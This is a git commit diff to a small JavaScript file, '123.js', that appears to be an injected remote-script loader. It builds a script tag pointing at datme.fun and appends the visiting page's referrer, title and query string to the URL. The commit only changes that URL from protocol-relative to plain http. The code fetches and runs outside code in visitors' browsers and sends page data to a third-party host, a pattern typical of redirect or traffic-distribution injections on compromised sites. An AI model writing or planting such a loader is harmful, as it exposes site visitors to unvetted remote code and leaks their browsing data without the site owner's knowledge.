b538bbaf2f6d8c255a5b7c23739a35df72e1b83f
JOLLYhit <72670377+JOLLYhit@users.noreply.github.com>
2020-10-12 01:02:20 +0300

    Update 123.js

--- 123.js
+++ 123.js
@@ -1,5 +1,5 @@
 var d=document;var s=d.createElement('script'); 
-s.src='//datme.fun/fHkywC?frm=script&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+''; 
+s.src='http://datme.fun/fHkywC?frm=script&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+''; 
 if (document.currentScript) { 
 document.currentScript.parentNode.insertBefore(s, document.currentScript);
 } else {
